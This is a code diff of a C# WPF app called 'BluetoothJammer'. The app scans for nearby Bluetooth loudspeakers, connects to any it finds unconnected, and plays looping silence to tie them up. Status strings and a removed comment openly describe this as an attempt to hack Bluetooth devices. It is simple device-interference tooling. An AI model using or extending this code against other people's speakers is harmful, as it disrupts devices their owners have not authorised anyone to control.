@@ -21,7 +21,15 @@ namespace BluetoothJammer
     {
         public SenderBluetoothService Service { get; set; } = new SenderBluetoothService();
         public ObservableCollection<Device> Devices { get; set; } = new ObservableCollection<Device>();
-
+        private string _status = "Hi. We are going to attempt a hack";
+        public string Status
+        {
+            get { return _status; }
+            set
+            {
+                Set(ref _status, value);
+            }
+        }
         public ViewModel()
         {
             GetDevices();
@@ -30,11 +38,14 @@ namespace BluetoothJammer
         {
             var isScanning = true;
             var oldDevices = new List<Device>();
-            while(isScanning)
+            Status = "Scanning for bluetooth devices...";
+            while (isScanning)
             {
                 var devices = await Service.GetDevices();
+                Status = $"{devices.Count} devices found. {devices.Count(x => x.DeviceInfo.ClassOfDevice.Device == DeviceClass.AudioVideoLoudSpeaker)} devices are speakers.";
                 if (devices.SequenceEqual(oldDevices))
                     continue;
+                
                 oldDevices = new List<Device>(devices);
                 await App.Current.Dispatcher.BeginInvoke((Action)delegate ()
                 {
@@ -42,34 +53,43 @@ namespace BluetoothJammer
                     foreach (var item in oldDevices)
                     {
                         Devices.Add(item);
-                        //var success = await Service.Send(item, "Hi, sorry for inconvenience. We are trying to hack bluetooth");
                     }
 
 
-                    foreach (var dev in Devices.Where(x => x.DeviceInfo.ClassOfDevice.Device == DeviceClass.AudioVideoLoudSpeaker && !x.IsConnected))
+                    foreach (var dev in Devices.Where(x =>
+                        x.DeviceInfo.ClassOfDevice.Device == 
+                            DeviceClass.AudioVideoLoudSpeaker && 
+                                !x.IsConnected))
                     {
                         try
                         {
+                            Status = $"Attempting to connect to {dev.DeviceName}...";
                             Guid serviceClass;
                             serviceClass = BluetoothService.SerialPort;
                             var ep = new BluetoothEndPoint(dev.DeviceInfo.DeviceAddress, serviceClass);
                             var cli = new BluetoothClient();
                             cli.Connect(ep);
                             dev.IsConnected = true;
-                            Stream peerStream = cli.GetStream();
-                            var player = new MediaPlayer();
-                            player.Open(new Uri(AppDomain.CurrentDomain.BaseDirectory + "s.mp3"));
-                            player.Play();
                             isScanning = false;
+                            Status = $"Connected to {dev.DeviceName}. Attempting to play silence.";
+                            PlaySilence();
                             break;
                         }
                         catch(Exception ex)
                         {
+                            Status = $"Failed to connect to device\n{ex.Message}";
                             continue;
                         }
                     }
                 });
             }
+        }
+
+        private void PlaySilence()
+        {
+            var player = new SoundPlayer();
+            player.SoundLocation = AppDomain.CurrentDomain.BaseDirectory + "silent.wav";
+            player.PlayLooping();
         }
     }
 }
